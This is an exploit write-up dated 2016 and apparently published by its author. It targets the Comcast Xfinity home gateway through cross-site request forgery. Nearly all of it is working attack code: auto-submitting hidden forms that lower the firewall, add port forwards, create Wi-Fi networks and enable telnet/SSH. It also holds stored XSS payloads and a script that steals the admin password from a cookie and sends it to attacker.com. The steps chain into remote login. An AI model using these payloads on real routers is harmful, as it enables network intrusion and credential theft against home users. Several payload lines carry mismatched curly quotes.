@@ -1,0 +1,348 @@
+EXPLOIT TITLE: CSRF RCE XFINITY WEB GATEWAY
+AUTHOR: Pabstersac
+DATE: 1ST OF AUGUST 2016
+CVE: N/A
+CATEGORY: REMOTE
+CONTACT: pabstersac@gmail.com
+
+IF ANYONE HAS COMMUNICATION WITH VENDOR PLEASE NOTIFY THEM SINCE THEY HAVE IGNORED ME.
+CSRF FOR COMCAST XFINITY WEB GATEWAY. LEADS TO RCE AND ACCESS TO THE NETWORK AND MORE.
+VENDOR HAS BEEN NOTIFIED NUMEROUS TIMES BUT NO RESPONSE RECEIVED.
+
+1) ADD BLOCKED SITE
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_add_blockedSite.php" method="post">
+
+<input type="hidden" name='BlockInfo' value='{"URL": "http://test1.com", "alwaysBlock": "true"}'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+2) ADD BLOCKED KEYWORD
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_add_blockedSite.php" method="post">
+
+<input type="hidden" name='BlockInfo' value=‘{“Keyword”: "http://test1.com", "alwaysBlock": "true"}'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+3) REMOVE BLOCKED SITE OR KEYWORD
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_remove_blockedSite.php" method="post">
+
+<input type="hidden" name='removeBlockInfo' value='{"InstanceID": "6"}'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+4) TRUST/UNTRUST DEVICES
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_trust_computer.php" method="post">
+
+<input type="hidden" name='TrustFlag' value='{"trustFlag": "true", "HostName": "test", "IPAddress": "10.0.0.82"}'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+5) DISABLE/ENABLE MANAGED SITES
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_enable_manageSite.php" method="post">
+
+<input type="hidden" name='Enable' value='{"Enable": "true"}'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+6) ADD MANAGED SERVICE (COMES WITH BONUS STORED XSS ;)
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_services.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='service' value='<img src=x onerror=alert(0)>'>
+<input type="hidden" name='protocol' value='UDP'>
+<input type="hidden" name='startPort' value='1234'>
+<input type="hidden" name='endPort' value='1234'>
+<input type="hidden" name='block' value='true'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+7) DELETE MANAGED SERVICE
+
+http://10.0.0.1/actionHandler/ajax_managed_services.php?del=1
+
+
+8) DISABLE/ENABLE MANAGED SERVICES
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_services.php" method="post">
+
+<input type="hidden" name='set' value='true'>
+<input type="hidden" name='UMSStatus' value='Enabled'>
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+9) UNBLOCK DEVICE
+
+http://10.0.0.1/actionHandler/ajax_managed_devices.php?del=2
+
+
+10) ADD BLOCKED DEVICE (COMES WITH BONUS STORED XSS ;)
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='type' value='Block'>
+<input type="hidden" name='name' value='<img src=x onerror=alert(0)>'>
+<input type="hidden" name='mac' value='xx:xx:xx:xx:xx:x2'>
+<input type="hidden" name='block' value='true'>
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+11) ENABLE/DISABLE MANAGED DEVICES
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
+
+<input type="hidden" name='set' value='true'>
+<input type="hidden" name='UMDStatus' value='Enabled'>
+
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+12) ADD PORT FORWARDING SERVICE (COMES WITH BONUS STORED XSS ;)
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='name' value='<img src=x onerror=alert(1)>'>
+<input type="hidden" name='protocol' value='TCP/UDP'>
+<input type="hidden" name='ip' value='10.0.0.82'>
+<input type="hidden" name='ipv6addr' value='x'>
+<input type="hidden" name='startport' value='123'>
+<input type="hidden" name='endport' value='123'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+13) DELETE A PORT FORWARDING SERVICE
+
+http://10.0.0.1/actionHandler/ajax_port_forwarding.php?del=5
+
+
+14) EDIT EXISTING PORT FORWARDING SERVICES
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
+
+<input type="hidden" name='edit' value='true'>
+<input type="hidden" name='name' value=‘huhuhuh???New Name then …’>
+<input type="hidden" name='protocol' value='TCP/UDP'>
+<input type="hidden" name='ip' value='10.0.0.82'>
+<input type="hidden" name='ipv6addr' value='x'>
+<input type="hidden" name='startport' value='123'>
+<input type="hidden" name='endport' value='123'>
+<input type="hidden" name='ID' value='4'>
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+15) ENABLE/DISABLE PORT FORWARDING
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
+
+<input type="hidden" name='set' value='true'>
+<input type="hidden" name='UFWDStatus' value='Enabled'>
+
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+I’ll ignore port triggering cuz idc about port triggering . . .
+
+16) CHANGE REMOTE MANAGEMENT SERVICE
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_remote_management.php" method="post">
+
+<input type="hidden" name='http' value='true'>
+<input type="hidden" name='httport' value='notset'>
+<input type="hidden" name='https' value='true'>
+<input type="hidden" name='httpsport' value='notset'>
+<input type="hidden" name='allowtype' value='notset'>
+<input type="hidden" name='startIP' value='notset'>
+<input type="hidden" name='endIP' value='notset'>
+<input type="hidden" name='telnet' value='notset'>
+<input type="hidden" name='ssh' value='notset'>
+<input type="hidden" name='startIPv6' value='notset'>
+<input type="hidden" name='endIPv6' value='notset'>
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+17) CHANGE FIREWALL SETTINGS
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_firewall_config.php" method="post">
+
+<input type="hidden" name='configInfo' value='{"firewallLevel": "Low", "block_http": "Disabled", "block_icmp": "Disabled", "block_multicast": "Disabled", "block_peer": "Disabled", "block_ident": "Disabled", "disableFwForTrueStaticIP": "undefined"} '>
+
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+
+18) CHANGE PASSWORD PoC
+
+UPLOAD test1.js TO yourjavascript.com (OR USE THE ONE I ALREADY UPLOADED : http://yourjavascript.com/1663477161/test1.js )
+CONTENTS ARE:
+document.cookie="PHPSESSID=1";k=document.cookie;f=k.replace("PHPSESSID=1","");d=f.replace("auth=","");s=d.replace(";","");g=s.replace("%3D","");t=atob(g);console.log(t);l=t.replace("admin:","");console.log(l);var xhttp=new XMLHttpRequest();xhttp.open("POST","/actionHandler/ajaxSet_password_config.php",true);xhttp.send('configInfo={"newPassword": “testpassword123”, "oldPassword”: “’+ l+’”}’);
+
+SHORTEN URL ON GOOGLE (OR USE THE ONE I ALREADY SHORTENED : http://goo.gl/FQHkQj)
+
+CREATE HTML FILE : 
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='type' value='Block'>
+<input type="hidden" name='name' value='<script src="http://goo.gl/FQHkQj">'>
+<input type="hidden" name='mac' value='xx:xx:xx:xx:xx:x8'>
+<input type="hidden" name='block' value='true'>
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+I PUT ON SRC IN THE SCRIPT TAG MY SHORTENED URL
+
+
+19) GET PASSWORD PoC
+
+UPLOAD test1.js TO yourjavascript.com
+CONTENTS ARE:
+document.cookie="PHPSESSID=1";k=document.cookie;f=k.replace("PHPSESSID=1","");d=f.replace("auth=","");s=d.replace(";","");g=s.replace("%3D","");t=atob(g);console.log(t);l=t.replace("admin:","");console.log(l);var xhttp=new XMLHttpRequest();xhttp.open("POST","http://attacker.com/get_password.php",true);xhttp.send('configInfo={"newPassword": “testpassword123”, "oldPassword”: “’+ l+’”}’);
+
+SHORTEN URL ON GOOGLE 
+
+CREATE HTML FILE : 
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='type' value='Block'>
+<input type="hidden" name='name' value='<script src="shortened url">'>
+<input type="hidden" name='mac' value='xx:xx:xx:xx:xx:x8'>
+<input type="hidden" name='block' value='true'>
+
+
+</form>
+
+<script>document.x.submit();</script>
+
+I PUT ON SRC IN THE SCRIPT TAG MY SHORTENED URL
+20) ACCESS DEVICES IN THE NETWORK
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='name' value='something'>
+<input type="hidden" name='protocol' value='TCP/UDP'>
+<input type="hidden" name='ip' value='Target Internal IP'>
+<input type="hidden" name='ipv6addr' value='x'>
+<input type="hidden" name='startport' value='Target Port'>
+<input type="hidden" name='endport' value='Target Port'>
+
+</form>
+
+<script>document.x.submit();</script>
+
+21) CREATE A NEW PRIVATE WI-FI NETWORK WITH THE PASSWORD OF YOUR CHOICE:
+
+<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_wireless_network_configuration_edit.php" method="post">
+
+<input type="hidden" name='configInfo' value='{"radio_enable":"true", "network_name":"MY-OWN-PRIVATE-PERSONAL-NETWORK", "wireless_mode":"g,n", "security":"WPAWPA2_PSK_TKIPAES", "channel_automatic":"true", "channel_number":"5", "network_password”:”password”, "broadcastSSID":"true", "enableWMM":"true", "ssid_number”:”3”}’>
+
+</form>
+
+<script>document.x.submit();</script>
+
+22) RCE
+HTML FILE:
+<form name="x" action="http://10.0.0.1/actionHandler/ajax_remote_management.php" method="post">
+
+<input type="hidden" name='http' value='true'>
+<input type="hidden" name='httport' value='notset'>
+<input type="hidden" name='https' value='true'>
+<input type="hidden" name='httpsport' value='notset'>
+<input type="hidden" name='allowtype' value='notset'>
+<input type="hidden" name='startIP' value='notset'>
+<input type="hidden" name='endIP' value='notset'>
+<input type="hidden" name='telnet' value='true'>
+<input type="hidden" name='ssh' value='true'>
+<input type="hidden" name='startIPv6' value='notset'>
+<input type="hidden" name='endIPv6' value='notset'>
+
+
+</form>
+<!--Do part 19)-->
+
+<form name="h" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
+
+<input type="hidden" name='add' value='true'>
+<input type="hidden" name='type' value='Block'>
+<input type="hidden" name='name' value='<script src="shortened url">'>
+<input type="hidden" name='mac' value='xx:xx:xx:xx:xx:x8'>
+<input type="hidden" name='block' value='true'>
+
+
+</form>
+
+
+<form name="f" action="http://10.0.0.1/actionHandler/ajaxSet_firewall_config.php" method="post">
+
+<input type="hidden" name='configInfo' value='{"firewallLevel": "Low", "block_http": "Disabled", "block_icmp": "Disabled", "block_multicast": "Disabled", "block_peer": "Disabled", "block_ident": "Disabled", "disableFwForTrueStaticIP": "undefined"} '>
+
+
+
+</form>
+<script>document.x.submit();document.h.submit();document.f.submit();</script>
+
+THEN TELNET TO THE IP ADDRESS THAT SENT THE REQUEST TO ATTACKER.COM/GET_PASSWORD.PHP AND USE THE USERNAME 'admin' AND THE PASSWORD YOU GOT IN ATTACKER.COM/GET_PASSWORD.PHP
+
+THE AUTHOR TAKES NO RESPONSIBILITY FOR DAMAGE DONE WITH THIS EXPLOIT.
+FOR PUBLISHING OR SENDING OR COPYING THIS EXPLOIT THE AUTHOR MUST BE GIVEN FULL CREDIT FOR THE EXPLOIT.
+IF THE VULNERABILITY IS REPORTED TO VENDOR AND VENDOR RESPONDS AND FIXES IT THEN FULL CREDIT MUST BE GIVEN TO THE AUTHOR.
